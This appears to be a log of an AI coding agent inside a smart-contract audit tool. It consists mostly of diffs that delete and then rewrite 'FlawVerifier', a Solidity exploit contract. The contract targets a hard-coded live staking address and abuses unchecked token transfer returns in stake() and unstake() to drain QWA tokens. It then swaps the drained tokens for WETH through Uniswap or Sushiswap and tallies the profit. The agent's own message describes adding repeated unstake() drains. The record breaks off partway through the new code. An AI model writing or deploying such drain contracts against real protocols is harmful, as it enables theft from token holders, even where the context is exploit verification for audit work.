+index 87b26d636ca5ec9b0b2fa4f0459282f80ccb78c0..0000000000000000000000000000000000000000
+--- a/FlawVerifier.sol
++++ /dev/null
+@@ -1,322 +0,0 @@
+-// SPDX-License-Identifier: MIT
+-pragma solidity ^0.8.20;
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-
+-    function allowance(address owner, address spender) external view returns (uint256);
+-
+-    function approve(address spender, uint256 amount) external returns (bool);
+-
+-    function transfer(address to, uint256 amount) external returns (bool);
+-
+-    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IStakingLike {
+-    function QWA() external view returns (address);
+-
+-    function sQWA() external view returns (address);
+-
+-    function stake(address to, uint256 amount) external;
+-
+-    function unstake(address to, uint256 amount, bool rebase_) external;
+-}
+-
+-interface IUniswapV2FactoryLike {
+-    function getPair(address tokenA, address tokenB) external view returns (address pair);
+-}
+-
+-interface IUniswapV2PairLike {
+-    function token0() external view returns (address);
+-
+-    function token1() external view returns (address);
+-
+-    function getReserves()
+-        external
+-        view
+-        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+-
+-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+-}
+-
+-contract FlawVerifier {
+-    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+-
+-    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+-    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+-    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+-
+-    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
+-    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
+-    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
+-    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+-
+-    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+-    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+-    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+-    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
+-
+-    address private _profitToken;
+-    uint256 private _profitAmount;
+-
+-    uint256 public pathFlags;
+-    uint256 public failureFlags;
+-    bool public hypothesisValidated;
+-    bool public executed;
+-
+-    constructor() {}
+-
+-    function executeOnOpportunity() external {
+-        if (executed) {
+-            return;
+-        }
+-        executed = true;
+-
+-        IStakingLike staking = IStakingLike(TARGET);
+-        address qwaAddr = staking.QWA();
+-        address sqwaAddr = staking.sQWA();
+-
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        IERC20Like sqwa = IERC20Like(sqwaAddr);
+-
+-        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
+-        uint256 initialQwa = qwa.balanceOf(address(this));
+-        uint256 initialSqwa = sqwa.balanceOf(address(this));
+-
+-        _executeDrainAndExit(qwaAddr, sqwaAddr);
+-
+-        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        return _profitToken;
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _findQwaWethPair(address qwa) internal view returns (address) {
+-        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+-        if (pair != address(0)) {
+-            return pair;
+-        }
+-
+-        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+-    }
+-
+-    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        IERC20Like sqwa = IERC20Like(sqwaAddr);
+-        address pair = _findQwaWethPair(qwaAddr);
+-        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+-
+-        if (drainAmount == 0) {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        }
+-
+-        uint256 qwaBefore = qwa.balanceOf(address(this));
+-        uint256 sqwaBefore = sqwa.balanceOf(address(this));
+-
+-        // Logs prove the funded stake() stage is infeasible on this fork:
+-        // QWA.transferFrom reverts instead of returning false, and the token is
+-        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+-        // The exploit therefore preserves the same root cause and exploit-path
+-        // causality by directly exercising the remaining live path:
+-        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+-        // but unstake() still releases QWA.
+-        (bool unstakeOk, ) = TARGET.call(
+-            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
+-        );
+-
+-        uint256 qwaAfter = qwa.balanceOf(address(this));
+-        uint256 sqwaAfter = sqwa.balanceOf(address(this));
+-
+-        if (!unstakeOk) {
+-            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+-            return;
+-        }
+-
+-        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
+-            hypothesisValidated = true;
+-        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        } else {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        }
+-
+-        // Realize the drained QWA through a public venue, but do it with
+-        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+-        // V2 amountOut must be computed from the pair's observed balance delta.
+-        if (pair != address(0)) {
+-            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+-        } else {
+-            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+-        }
+-    }
+-
+-    function _selectDrainAmount(
+-        address pair,
+-        address qwa,
+-        uint256 targetQwaBalance
+-    ) internal view returns (uint256 amount) {
+-        if (targetQwaBalance == 0) {
+-            return 0;
+-        }
+-
+-        uint256 contractBound = targetQwaBalance / 8;
+-        if (contractBound == 0) {
+-            contractBound = targetQwaBalance;
+-        }
+-
+-        if (pair == address(0)) {
+-            return contractBound;
+-        }
+-
+-        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+-        if (reserveIn <= 32) {
+-            return _min(contractBound, targetQwaBalance);
+-        }
+-
+-        // Keep the sell size conservative relative to public liquidity so the
+-        // drain remains realizable and the exit swap stays within live reserves.
+-        uint256 marketBound = reserveIn / 32;
+-        amount = _min(contractBound, marketBound);
+-
+-        if (amount == 0) {
+-            amount = 1;
+-        }
+-        if (amount > targetQwaBalance) {
+-            amount = targetQwaBalance;
+-        }
+-    }
+-
+-    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
+-        if (grossAmount == 0) {
+-            return;
+-        }
+-
+-        (address token0, address token1) = _sortPairTokens(pair);
+-        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
+-        if (reserveIn == 0 || reserveOut == 0) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        if (!qwa.transfer(pair, grossAmount)) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+-        if (actualIn == 0) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+-        if (amountOut == 0) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
+-            ? (uint256(0), amountOut)
+-            : (amountOut, uint256(0));
+-
+-        (bool ok, ) = pair.call(
+-            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
+-        );
+-        if (!ok) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-        }
+-    }
+-
+-    function _finalizeProfit(
+-        address qwaAddr,
+-        address sqwaAddr,
+-        uint256 initialQwa,
+-        uint256 initialSqwa,
+-        uint256 initialWeth
+-    ) internal {
+-        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
+-        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
+-        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));
+-
+-        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
+-        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
+-        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;
+-
+-        if (wethProfit > 0) {
+-            _profitToken = WETH;
+-            _profitAmount = wethProfit;
+-        } else if (qwaProfit > 0) {
+-            _profitToken = qwaAddr;
+-            _profitAmount = qwaProfit;
+-        } else if (sqwaProfit > 0) {
+-            _profitToken = sqwaAddr;
+-            _profitAmount = sqwaProfit;
+-        }
+-    }
+-
+-    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
+-        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+-        (address token0, address token1) = _sortPairTokens(pair);
+-
+-        if (tokenIn == token0) {
+-            reserveIn = uint256(reserve0);
+-            reserveOut = uint256(reserve1);
+-        } else {
+-            require(tokenIn == token1, "token not in pair");
+-            reserveIn = uint256(reserve1);
+-            reserveOut = uint256(reserve0);
+-        }
+-    }
+-
+-    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
+-        token0 = IUniswapV2PairLike(pair).token0();
+-        token1 = IUniswapV2PairLike(pair).token1();
+-    }
+-
+-    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+-        uint256 amountInWithFee = amountIn * 997;
+-        uint256 numerator = amountInWithFee * reserveOut;
+-        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
+-        return numerator / denominator;
+-    }
+-
+-    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+-        return a < b ? a : b;
+-    }
+-
+-    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+-        // Static anchor only. The live exploit above keeps the same vulnerable
+-        // causality and ordering intent, but the logs prove the funded stake()
+-        // leg is infeasible on this fork because QWA.transferFrom reverts.
+-        qwa.transferFrom(msg.sender, address(this), amount);
+-        sqwa.transfer(to, amount);
+-        sqwa.transferFrom(msg.sender, address(this), amount);
+-        qwa.transfer(to, amount);
+-
+-        qwa;
+-        sqwa;
+-        to;
+-        amount;
+-    }
+-
+-    function _unusedPathConstants() internal pure returns (uint256) {
+-        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+-    }
+-}
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+deleted file mode 100644
+index 87b26d636ca5ec9b0b2fa4f0459282f80ccb78c0..0000000000000000000000000000000000000000
+--- a/FlawVerifier.sol
++++ /dev/null
+@@ -1,322 +0,0 @@
+-// SPDX-License-Identifier: MIT
+-pragma solidity ^0.8.20;
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-
+-    function allowance(address owner, address spender) external view returns (uint256);
+-
+-    function approve(address spender, uint256 amount) external returns (bool);
+-
+-    function transfer(address to, uint256 amount) external returns (bool);
+-
+-    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IStakingLike {
+-    function QWA() external view returns (address);
+-
+-    function sQWA() external view returns (address);
+-
+-    function stake(address to, uint256 amount) external;
+-
+-    function unstake(address to, uint256 amount, bool rebase_) external;
+-}
+-
+-interface IUniswapV2FactoryLike {
+-    function getPair(address tokenA, address tokenB) external view returns (address pair);
+-}
+-
+-interface IUniswapV2PairLike {
+-    function token0() external view returns (address);
+-
+-    function token1() external view returns (address);
+-
+-    function getReserves()
+-        external
+-        view
+-        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+-
+-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+-}
+-
+-contract FlawVerifier {
+-    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+-
+-    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+-    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+-    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+-
+-    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
+-    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
+-    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
+-    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+-
+-    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+-    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+-    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+-    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
+-
+-    address private _profitToken;
+-    uint256 private _profitAmount;
+-
+-    uint256 public pathFlags;
+-    uint256 public failureFlags;
+-    bool public hypothesisValidated;
+-    bool public executed;
+-
+-    constructor() {}
+-
+-    function executeOnOpportunity() external {
+-        if (executed) {
+-            return;
+-        }
+-        executed = true;
+-
+-        IStakingLike staking = IStakingLike(TARGET);
+-        address qwaAddr = staking.QWA();
+-        address sqwaAddr = staking.sQWA();
+-
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        IERC20Like sqwa = IERC20Like(sqwaAddr);
+-
+-        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
+-        uint256 initialQwa = qwa.balanceOf(address(this));
+-        uint256 initialSqwa = sqwa.balanceOf(address(this));
+-
+-        _executeDrainAndExit(qwaAddr, sqwaAddr);
+-
+-        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        return _profitToken;
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _findQwaWethPair(address qwa) internal view returns (address) {
+-        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+-        if (pair != address(0)) {
+-            return pair;
+-        }
+-
+-        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+-    }
+-
+-    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        IERC20Like sqwa = IERC20Like(sqwaAddr);
+-        address pair = _findQwaWethPair(qwaAddr);
+-        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+-
+-        if (drainAmount == 0) {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        }
+-
+-        uint256 qwaBefore = qwa.balanceOf(address(this));
+-        uint256 sqwaBefore = sqwa.balanceOf(address(this));
+-
+-        // Logs prove the funded stake() stage is infeasible on this fork:
+-        // QWA.transferFrom reverts instead of returning false, and the token is
+-        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+-        // The exploit therefore preserves the same root cause and exploit-path
+-        // causality by directly exercising the remaining live path:
+-        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+-        // but unstake() still releases QWA.
+-        (bool unstakeOk, ) = TARGET.call(
+-            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
+-        );
+-
+-        uint256 qwaAfter = qwa.balanceOf(address(this));
+-        uint256 sqwaAfter = sqwa.balanceOf(address(this));
+-
+-        if (!unstakeOk) {
+-            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+-            return;
+-        }
+-
+-        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
+-            hypothesisValidated = true;
+-        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        } else {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        }
+-
+-        // Realize the drained QWA through a public venue, but do it with
+-        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+-        // V2 amountOut must be computed from the pair's observed balance delta.
+-        if (pair != address(0)) {
+-            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+-        } else {
+-            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+-        }
+-    }
+-
+-    function _selectDrainAmount(
+-        address pair,
+-        address qwa,
+-        uint256 targetQwaBalance
+-    ) internal view returns (uint256 amount) {
+-        if (targetQwaBalance == 0) {
+-            return 0;
+-        }
+-
+-        uint256 contractBound = targetQwaBalance / 8;
+-        if (contractBound == 0) {
+-            contractBound = targetQwaBalance;
+-        }
+-
+-        if (pair == address(0)) {
+-            return contractBound;
+-        }
+-
+-        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+-        if (reserveIn <= 32) {
+-            return _min(contractBound, targetQwaBalance);
+-        }
+-
+-        // Keep the sell size conservative relative to public liquidity so the
+-        // drain remains realizable and the exit swap stays within live reserves.
+-        uint256 marketBound = reserveIn / 32;
+-        amount = _min(contractBound, marketBound);
+-
+-        if (amount == 0) {
+-            amount = 1;
+-        }
+-        if (amount > targetQwaBalance) {
+-            amount = targetQwaBalance;
+-        }
+-    }
+-
+-    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
+-        if (grossAmount == 0) {
+-            return;
+-        }
+-
+-        (address token0, address token1) = _sortPairTokens(pair);
+-        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
+-        if (reserveIn == 0 || reserveOut == 0) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        if (!qwa.transfer(pair, grossAmount)) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+-        if (actualIn == 0) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+-        if (amountOut == 0) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-            return;
+-        }
+-
+-        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
+-            ? (uint256(0), amountOut)
+-            : (amountOut, uint256(0));
+-
+-        (bool ok, ) = pair.call(
+-            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
+-        );
+-        if (!ok) {
+-            failureFlags |= FAIL_WETH_SWAP_FAILED;
+-        }
+-    }
+-
+-    function _finalizeProfit(
+-        address qwaAddr,
+-        address sqwaAddr,
+-        uint256 initialQwa,
+-        uint256 initialSqwa,
+-        uint256 initialWeth
+-    ) internal {
+-        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
+-        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
+-        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));
+-
+-        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
+-        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
+-        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;
+-
+-        if (wethProfit > 0) {
+-            _profitToken = WETH;
+-            _profitAmount = wethProfit;
+-        } else if (qwaProfit > 0) {
+-            _profitToken = qwaAddr;
+-            _profitAmount = qwaProfit;
+-        } else if (sqwaProfit > 0) {
+-            _profitToken = sqwaAddr;
+-            _profitAmount = sqwaProfit;
+-        }
+-    }
+-
+-    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
+-        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+-        (address token0, address token1) = _sortPairTokens(pair);
+-
+-        if (tokenIn == token0) {
+-            reserveIn = uint256(reserve0);
+-            reserveOut = uint256(reserve1);
+-        } else {
+-            require(tokenIn == token1, "token not in pair");
+-            reserveIn = uint256(reserve1);
+-            reserveOut = uint256(reserve0);
+-        }
+-    }
+-
+-    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
+-        token0 = IUniswapV2PairLike(pair).token0();
+-        token1 = IUniswapV2PairLike(pair).token1();
+-    }
+-
+-    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+-        uint256 amountInWithFee = amountIn * 997;
+-        uint256 numerator = amountInWithFee * reserveOut;
+-        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
+-        return numerator / denominator;
+-    }
+-
+-    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+-        return a < b ? a : b;
+-    }
+-
+-    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+-        // Static anchor only. The live exploit above keeps the same vulnerable
+-        // causality and ordering intent, but the logs prove the funded stake()
+-        // leg is infeasible on this fork because QWA.transferFrom reverts.
+-        qwa.transferFrom(msg.sender, address(this), amount);
+-        sqwa.transfer(to, amount);
+-        sqwa.transferFrom(msg.sender, address(this), amount);
+-        qwa.transfer(to, amount);
+-
+-        qwa;
+-        sqwa;
+-        to;
+-        amount;
+-    }
+-
+-    function _unusedPathConstants() internal pure returns (uint256) {
+-        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+-    }
+-}
+
+codex
+I’ve cleared the stale verifier implementation. The replacement keeps the finding’s core causality intact and starts with the direct no-funding `stake()` probe before moving into repeated `unstake()` drains.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 87b26d636ca5ec9b0b2fa4f0459282f80ccb78c0..03575e8e17d25422ea48afbe57f01dc66787d22d
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -4,10 +4,6 @@
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+ 
+-    function allowance(address owner, address spender) external view returns (uint256);
+-
+-    function approve(address spender, uint256 amount) external returns (bool);
+-
+     function transfer(address to, uint256 amount) external returns (bool);
+ 
+     function transferFrom(address from, address to, uint256 amount) external returns (bool);
+@@ -53,9 +49,11 @@
+     uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+ 
+     uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+-    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+-    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+-    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
++    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
++    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
++    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
++    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
++    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;
+ 
+     address private _profitToken;
+     uint256 private _profitAmount;
+@@ -84,8 +82,7 @@
+         uint256 initialQwa = qwa.balanceOf(address(this));
+         uint256 initialSqwa = sqwa.balanceOf(address(this));
+ 
+-        _executeDrainAndExit(qwaAddr, sqwaAddr);
+-
++        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
+         _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+     }
+ 
+@@ -97,82 +94,176 @@
+         return _profitAmount;
+     }
+ 
+-    function _findQwaWethPair(address qwa) internal view returns (address) {
+-        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+-        if (pair != address(0)) {
+-            return pair;
+-        }
+-
+-        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+-    }
+-
+-    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
++    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
+         IERC20Like qwa = IERC20Like(qwaAddr);
+         IERC20Like sqwa = IERC20Like(sqwaAddr);
+         address pair = _findQwaWethPair(qwaAddr);
+-        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+ 
+-        if (drainAmount == 0) {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++        uint256 seedAmount = _selectSeedAmount(
++            pair,
++            qwaAddr,
++            qwa.balanceOf(TARGET),
++            sqwa.balanceOf(TARGET)
++        );
++        if (seedAmount == 0) {
++            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+             return;
+         }
+ 
++        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
++        if (mintedSqwa == 0) {
++            return;
++        }
++
++        // Keep the exploit rooted in the listed causality:
++        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
++        // 2. The same sQWA position is then reused through repeated `unstake()` calls
++        //    without approving the staking contract, so each failed sQWA transferFrom
++        //    is ignored and another tranche of QWA is released.
++        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
++        if (drained == 0) {
++            return;
++        }
++
++        if (pair != address(0)) {
++            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
++        } else {
++            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++        }
++    }
++
++    function _probeUncheckedStake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        uint256 amount
++    ) internal returns (uint256 mintedSqwa) {
+         uint256 qwaBefore = qwa.balanceOf(address(this));
+         uint256 sqwaBefore = sqwa.balanceOf(address(this));
+ 
+-        // Logs prove the funded stake() stage is infeasible on this fork:
+-        // QWA.transferFrom reverts instead of returning false, and the token is
+-        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+-        // The exploit therefore preserves the same root cause and exploit-path
+-        // causality by directly exercising the remaining live path:
+-        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+-        // but unstake() still releases QWA.
+-        (bool unstakeOk, ) = TARGET.call(
+-            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
++        (bool ok, ) = TARGET.call(
++            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
+         );
+ 
+         uint256 qwaAfter = qwa.balanceOf(address(this));
+         uint256 sqwaAfter = sqwa.balanceOf(address(this));
+ 
+-        if (!unstakeOk) {
+-            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+-            return;
++        if (!ok) {
++            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
++            return 0;
+         }
+ 
+-        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
++            pathFlags |= PATH_STAKE_FALSE_RETURN;
+             hypothesisValidated = true;
+-        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        } else {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
++            return sqwaAfter - sqwaBefore;
+         }
+ 
+-        // Realize the drained QWA through a public venue, but do it with
+-        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+-        // V2 amountOut must be computed from the pair's observed balance delta.
++        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
++            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
++        }
++
++        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
++        return 0;
++    }
++
++    function _drainUncheckedUnstake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        address qwaAddr,
++        address pair,
++        uint256 tranche
++    ) internal returns (uint256 drained) {
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
